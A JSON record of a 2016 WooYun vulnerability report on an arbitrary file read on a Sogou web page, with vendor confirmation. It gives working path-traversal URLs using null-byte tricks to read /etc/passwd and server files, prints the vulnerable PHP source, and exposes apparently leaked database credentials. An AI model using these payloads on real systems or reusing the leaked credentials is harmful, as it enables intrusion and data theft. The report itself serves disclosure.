{"id": 88302, "wybug_id": "wooyun-2016-0210021", "wybug_title": "搜狗某站任意文件读取                                      ", "wybug_corp": "搜狗", "wybug_author": "Vinc", "wybug_date": "2016-05-18 11:39", "wybug_open_date": "2016-07-02 12:10", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-02：\t细节向公众公开  简要描述： rt 详细说明：  ie.sogou.com/designguidelines/getimage.php?cate=uikit&index=/../../../../../../etc/passwd%00.jpg&type=2\n\n来看看这个文件：ie.sogou.com/designguidelines/getimage.php?cate=uikit&index=/../../../designguidelines/getimage.php%00.jpg&type=2$path = \"resource/\".$cate.\"/\";if(strpos($cate, \"/\") || strpos($index, \"/\") || !file_exists($path.$index.$type)) {    echo \"input error.\";    exit;}header('Content-type: application/x-png');if (preg_match(\"/MSIE/\", $ua)) {    header('Content-Disposition: attachment; filename=\"'.rawurlencode($name) . '\"');} else if (preg_match(\"/Firefox/\", $ua)) {    header('Content-Disposition: attachment; filename*=\"utf8\\'\\'' . rawurlencode($name) . '\"');} else {    header('Content-Disposition: attachment; filename=\"'. $name . '\"');}$data = readfile($path.$index.$type);   漏洞证明：  数据库配置/designguidelines/getimage.php?cate=uikit&index=/../../../help2/inc/mysql.php%00.jpg&type=2\t\"user\" => \"seskin\",\t\"pwd\" => \"sogouse@2011\",\t\"dbname\" => \"seskin\"   修复方案：  赶紧修吧 我再审审   版权声明：转载请注明来源 Vinc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-05-18 12:05 厂商回复： 非常感谢您的报告，问题已着手处理，感谢您对搜狗安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}